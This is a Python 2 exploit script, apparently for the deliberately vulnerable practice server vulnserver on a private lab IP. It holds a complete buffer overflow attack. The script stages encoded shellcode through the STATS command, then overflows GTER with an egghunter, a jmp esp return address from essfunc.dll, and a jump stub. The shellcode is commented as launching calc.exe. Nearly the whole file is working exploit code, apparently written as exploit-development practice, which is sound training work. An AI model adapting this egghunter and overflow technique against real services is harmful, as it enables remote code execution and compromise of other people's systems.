import socket

server = '192.168.228.4'  # The server's hostname or IP address
port = 9999               # The port used by the server

#calc.exe
buf =  ""
buf += "\xbf\x19\xc4\xe6\xbf\xdd\xc4\xd9\x74\x24\xf4\x58\x29"
buf += "\xc9\xb1\x30\x31\x78\x13\x83\xc0\x04\x03\x78\x16\x26"
buf += "\x13\x43\xc0\x24\xdc\xbc\x10\x49\x54\x59\x21\x49\x02"
buf += "\x29\x11\x79\x40\x7f\x9d\xf2\x04\x94\x16\x76\x81\x9b"
buf += "\x9f\x3d\xf7\x92\x20\x6d\xcb\xb5\xa2\x6c\x18\x16\x9b"
buf += "\xbe\x6d\x57\xdc\xa3\x9c\x05\xb5\xa8\x33\xba\xb2\xe5"
buf += "\x8f\x31\x88\xe8\x97\xa6\x58\x0a\xb9\x78\xd3\x55\x19"
buf += "\x7a\x30\xee\x10\x64\x55\xcb\xeb\x1f\xad\xa7\xed\xc9"
buf += "\xfc\x48\x41\x34\x31\xbb\x9b\x70\xf5\x24\xee\x88\x06"
buf += "\xd8\xe9\x4e\x75\x06\x7f\x55\xdd\xcd\x27\xb1\xdc\x02"
buf += "\xb1\x32\xd2\xef\xb5\x1d\xf6\xee\x1a\x16\x02\x7a\x9d"
buf += "\xf9\x83\x38\xba\xdd\xc8\x9b\xa3\x44\xb4\x4a\xdb\x97"
buf += "\x17\x32\x79\xd3\xb5\x27\xf0\xbe\xd3\xb6\x86\xc4\x91"
buf += "\xb9\x98\xc6\x85\xd1\xa9\x4d\x4a\xa5\x35\x84\x2f\x59"
buf += "\x7c\x85\x19\xf2\xd9\x5f\x18\x9f\xd9\xb5\x5e\xa6\x59"
buf += "\x3c\x1e\x5d\x41\x35\x1b\x19\xc5\xa5\x51\x32\xa0\xc9"
buf += "\xc6\x33\xe1\xa9\x89\xa7\x69\x2e"

#egg B0P3B0P3
egghunter = '\x90\x90\x90\x90\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x42\x30\x50\x33\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7'

shellcode = "B0P3B0P3" + '\x90' * 24 + buf

preamble = 'GTER /.:/' + egghunter 

junk = preamble + (147 - len(egghunter)) * '\x41'

#0x625011af   jmp esp essfunc.dll
#esp only had 20 bytes need 32 for the egghunter
eip = '\xaf\x11\x50\x62'
#room at eax but points to GTER /.:/ so we jump that
#                         add eax,10      jmp eax
preshellcode = '\x90' + '\x83\xc0\x0C' + '\xff\xe0'

payload = junk + eip + preshellcode

exploit = payload + (5000 - len(payload)) * '\x43'

#first sent every command, after looking at what the egg jumps to STATS stores the shellcode. Also was not working if the same connection was reused
#for cmd in ["STATS ", "RTIME ", "LTIME ", "SRUN ", "TRUN ", "GMON ", "GDOG ", "HTER ", "LTER ", "KSTAN "]:

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((server,port))
print s.recv(1024)
s.send('STATS ' + shellcode)
print s.recv(1024)
s.close()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
     s.connect((server, port))
     print repr(s.recv(1024))
     s.send(exploit)
     print repr(s.recv(1024))
except:
     print "[!] connection refused, check debugger"
s.close()

